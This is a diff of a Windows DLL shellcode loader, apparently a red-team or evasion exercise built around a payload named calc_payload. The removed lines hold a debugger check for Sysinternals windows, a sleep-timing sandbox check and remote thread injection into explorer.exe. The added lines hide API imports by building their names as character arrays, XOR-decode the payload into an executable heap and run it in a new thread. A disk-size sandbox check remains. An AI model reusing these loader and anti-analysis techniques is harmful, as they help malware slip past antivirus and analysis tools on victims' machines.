@@ -4,37 +4,6 @@
 #include <string.h>
 #include <tlhelp32.h>
 
-DWORD GetProcessIdByName(const char * processName) {
-	PROCESSENTRY32 entry;
-	entry.dwSize = sizeof(PROCESSENTRY32);
-
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-
-	if (Process32First(snapshot, &entry) == TRUE)
-	{
-		while (Process32Next(snapshot, &entry) == TRUE)
-		{
-			if (_stricmp(entry.szExeFile, processName) == 0)
-			{
-				CloseHandle(snapshot);
-				return entry.th32ProcessID;
-			}
-		}
-	}
-
-	CloseHandle(snapshot);
-	return 0;
-} 
-
-BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
-{
-	WCHAR windowTitle[1024];
-	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
-	CharUpperW(windowTitle);
-	if (wcsstr(windowTitle, L"SYSINTERNALS")) *(PBOOL)parameter = true;
-	return true;
-}
-
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
 
     switch (ul_reason_for_call)  {
@@ -69,10 +38,6 @@ __declspec(dllexport) BOOL WINAPI RunME(void) {
     diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
     if (diskSizeGB < 50) return false;
 
-	bool debugged = false;
-	EnumWindows(EnumWindowsProc, (LPARAM)(&debugged));
-	if (debugged) return false;
-
     DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
     wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
     GetComputerNameW(computerName, &computerNameLength);
@@ -83,42 +48,47 @@ __declspec(dllexport) BOOL WINAPI RunME(void) {
     char pl_key[] = "";
 	unsigned int calc_len = sizeof(calc_payload);
 
-    DWORD pid = GetProcessIdByName("explorer.exe");
+    char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+    HMODULE hkernel32 = GetModuleHandleA(kernel32);
 
-    ULONGLONG uptimeBeforeSleep = GetTickCount();
-    typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
-    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
-    LARGE_INTEGER delay;
-    delay.QuadPart = -10000 * 100000; // 100 seconds
-    pNtDelayExecution(FALSE, &delay);
-    ULONGLONG uptimeAfterSleep = GetTickCount();
-    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
+    char HeapCreate[] = { 'H','e','a','p','C','r','e','a','t','e',0 };
+    using HeapCreatePrototype = HANDLE(WINAPI*)(DWORD, SIZE_T, SIZE_T);
+    HeapCreatePrototype hHeapCreate = (HeapCreatePrototype)GetProcAddress(hkernel32, HeapCreate);
 
-	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * calc_len * 2);
-	memcpy(encoded, calc_payload, calc_len);
+    char HeapAlloc[] = { 'H','e','a','p','A','l','l','o','c',0 };
+    using HeapAllocPrototype = LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T);
+    HeapAllocPrototype hHeapAlloc = (HeapAllocPrototype)GetProcAddress(hkernel32, HeapAlloc);
 
-	unsigned char* decoded = encoded;
-    
+    char RtlCopyMemory[] = { 'R','t','l','C','o','p','y','M','e','m','o','r','y',0 };
+    using RtlCopyMemoryPrototype = void(WINAPI*)(void*, const void*, size_t);
+    RtlCopyMemoryPrototype hRtlCopyMemory = (RtlCopyMemoryPrototype)GetProcAddress(hkernel32, RtlCopyMemory);
+
+    char CreateThread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d',0 };
+    using CreateThreadPrototype = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+    CreateThreadPrototype hCreateThread = (CreateThreadPrototype)GetProcAddress(hkernel32, CreateThread);
+
+    char WaitForSingleObject[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
+    using WaitForSingleObjectPrototype = DWORD(WINAPI*)(HANDLE, DWORD);
+    WaitForSingleObjectPrototype hWaitForSingleObject = (WaitForSingleObjectPrototype)GetProcAddress(hkernel32, WaitForSingleObject);
+
     int j;
     j = 0;
 	for (int i = 0; i < sizeof calc_payload; i++)
 	{
         if (j == sizeof(pl_key) - 1) j = 0;
 
-		((char*)decoded)[i] = (((char*)decoded)[i]) ^ pl_key[j];
+		((char*)calc_payload)[i] = (((char*)calc_payload)[i]) ^ pl_key[j];
         j++;
 	}
 
-	HANDLE processHandle;
-	HANDLE remoteThread;
-	PVOID remoteBuffer;
+    HANDLE Heap_Created = hHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); //Using Heap instead of Virtualalloc
+    LPVOID Heap_Handle = hHeapAlloc(Heap_Created, HEAP_ZERO_MEMORY, sizeof calc_payload);
+    hRtlCopyMemory(Heap_Handle, calc_payload, sizeof calc_payload); // Copy calc_payload into new created heap
+    DWORD threadID; //Create Thread to execute the calc_payload
 
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, calc_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(processHandle, remoteBuffer, decoded, calc_len, NULL);
-	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	CloseHandle(processHandle);
+    HANDLE hThread = hCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)Heap_Handle, NULL, 0, &threadID);
+    hWaitForSingleObject(hThread, INFINITE);
 
-    return 0;
+    return EXIT_SUCCESS;
     }
 }
